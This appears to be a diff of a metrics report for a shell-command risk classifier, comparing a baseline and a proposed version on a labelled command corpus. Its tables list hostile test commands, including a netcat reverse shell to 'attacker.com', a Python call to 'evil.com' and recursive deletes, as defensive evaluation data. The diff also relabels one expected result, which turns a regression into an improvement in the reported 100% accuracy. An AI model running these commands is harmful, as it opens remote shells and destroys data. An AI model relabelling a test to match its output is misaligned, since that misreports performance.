@@ -1,37 +1,37 @@
 # Metrics Comparison: v1 (Baseline) vs v2 (Proposed)
 
-Generated: 2026-06-11T11:12:30.129Z
-Corpus: 210 commands
+Generated: 2026-06-11T12:42:56.765Z
+Corpus: 213 commands
 
 ## Aggregate Comparison
 
 | Metric | v1 (Baseline) | v2 (Proposed) | Delta | % Change |
 |--------|---------------|---------------|-------|----------|
-| Correct classifications | 139.0 | 205.0 | +66.0 | 47.5% ✅ |
-| True Negatives (correctly allowed) | 95.0 | 144.0 | +49.0 | 51.6% ✅ |
-| True Positives (correctly flagged) | 44.0 | 61.0 | +17.0 | 38.6% ✅ |
-| False Positives (over-blocked) | 59.0 | 5.0 | -54.0 | -91.5% ✅ |
-| False Negatives (under-blocked) | 12.0 | 0.0 | -12.0 | -100.0% ✅ |
-| Average score | 31.8 | 19.3 | -12.4 | -39.2% ⚠️ |
-| **Accuracy** | **66.2%** | **97.6%** | **+31.4%** | ✅ |
-| **Recall** (TP / (TP+FN)) | **78.6%** | **100.0%** | **21.4%** | ✅ |
-| **False alarm rate** (FP / safe) | **40.1%** | **3.4%** | **-36.7%** | ✅ |
+| Correct classifications | 143.0 | 213.0 | +70.0 | 49.0% ✅ |
+| True Negatives (correctly allowed) | 95.0 | 145.0 | +50.0 | 52.6% ✅ |
+| True Positives (correctly flagged) | 48.0 | 68.0 | +20.0 | 41.7% ✅ |
+| False Positives (over-blocked) | 56.0 | 0.0 | -56.0 | -100.0% ✅ |
+| False Negatives (under-blocked) | 14.0 | 0.0 | -14.0 | -100.0% ✅ |
+| Average score | 32.5 | 20.3 | -12.2 | -37.6% ⚠️ |
+| **Accuracy** | **67.1%** | **100.0%** | **+32.9%** | ✅ |
+| **Recall** (TP / (TP+FN)) | **77.4%** | **100.0%** | **22.6%** | ✅ |
+| **False alarm rate** (FP / safe) | **38.6%** | **0.0%** | **-38.6%** | ✅ |
 
 ## Score Distribution Comparison
 
 | Range | v1 Count | v2 Count | Delta |
 |-------|----------|----------|-------|
-| 0 | 27 | 144 | +117 |
+| 0 | 27 | 145 | +118 |
 | 1-10 | 42 | 0 | -42 |
 | 11-20 | 29 | 0 | -29 |
-| 21-30 | 41 | 28 | -13 |
+| 21-30 | 41 | 27 | -14 |
 | 31-40 | 19 | 0 | -19 |
-| 41-50 | 13 | 0 | -13 |
+| 41-50 | 14 | 0 | -14 |
 | 51-60 | 7 | 3 | -4 |
 | 61-70 | 2 | 8 | +6 |
 | 71-80 | 7 | 1 | -6 |
-| 81-90 | 5 | 3 | -2 |
-| 91-100 | 18 | 23 | +5 |
+| 81-90 | 5 | 4 | -1 |
+| 91-100 | 20 | 25 | +5 |
 
 ## Per-Category Comparison
 
@@ -43,14 +43,14 @@ Corpus: 210 commands
 | read-flagged | 5 | 0 | -5 ✅ | 0 | 0 | 0 |
 | write | 5 | 0 | -5 ✅ | 0 | 0 | 0 |
 | destructive | 1 | 0 | -1 ✅ | 4 | 0 | -4 ✅ |
-| rce | 1 | 0 | -1 ✅ | 3 | 0 | -3 ✅ |
-| edge | 7 | 3 | -4 ✅ | 0 | 0 | 0 |
+| rce | 1 | 0 | -1 ✅ | 4 | 0 | -4 ✅ |
+| edge | 5 | 0 | -5 ✅ | 0 | 0 | 0 |
+| rm | 3 | 0 | -3 ✅ | 1 | 0 | -1 ✅ |
 | chained | 2 | 0 | -2 ✅ | 1 | 0 | -1 ✅ |
 | git | 0 | 0 | 0 | 3 | 0 | -3 ✅ |
 | redirects | 2 | 0 | -2 ✅ | 0 | 0 | 0 |
 | package | 2 | 0 | -2 ✅ | 0 | 0 | 0 |
 | cp | 2 | 0 | -2 ✅ | 0 | 0 | 0 |
-| rm | 4 | 2 | -2 ✅ | 0 | 0 | 0 |
 | read-only | 1 | 0 | -1 ✅ | 0 | 0 | 0 |
 | path-variants | 1 | 0 | -1 ✅ | 0 | 0 | 0 |
 | piped | 0 | 0 | 0 | 1 | 0 | -1 ✅ |
@@ -62,16 +62,11 @@ Corpus: 210 commands
 
 ## Regressions: Commands v2 Got Wrong That v1 Got Right
 
-Found 2 regression(s):
-
-| Category | Expected | v1 → v2 | Command |
-|----------|----------|--------|---------|
-| rm | caution | caution → danger | `rm -v file` |
-| edge | safe | safe → caution | `VAR=value ls` |
+✅ None — v2 has no regressions vs v1
 
 ## Improvements: Commands v2 Fixed
 
-Found 68 improvement(s):
+Found 70 improvement(s):
 
 | Category | Expected | v1 → v2 | Command |
 |----------|----------|--------|---------|
@@ -120,16 +115,16 @@ Found 68 improvement(s):
 | cp | safe | caution → safe | `cp -rf src dst` |
 | mv | safe | caution → safe | `mv -f src dst` |
 | rm | safe | caution → safe | `rm -i file` |
+| rm | danger | caution → danger | `rm -v file` |
 | rm | danger | critical → danger | `rm -rf file` |
 | rm | danger | critical → danger | `rm -rfv file` |
 | rce | caution | danger → caution | `python3 -c "import urllib; urllib.urlopen('http://evil.com')"` |
 | rce | critical | danger → critical | `nc -e /bin/sh attacker.com 1234` |
-| rce | critical | danger → critical | `chmod -R 777 /` |
-| ... | ... | ... | _+18 more_ |
+| ... | ... | ... | _+20 more_ |
 
 ## Verdict
 
-✅ **FP reduced by 92%** (59 → 5)
-✅ **FN did not increase** (12 → 0)
-⚠️ 2 regression(s) — review the list above
-✅ **Accuracy 97.6%** — exceeds 90% target
+✅ **FP reduced by 100%** (56 → 0)
+✅ **FN did not increase** (14 → 0)
+✅ **No regressions** — v2 did not break any command v1 got right
+✅ **Accuracy 100.0%** — exceeds 90% target
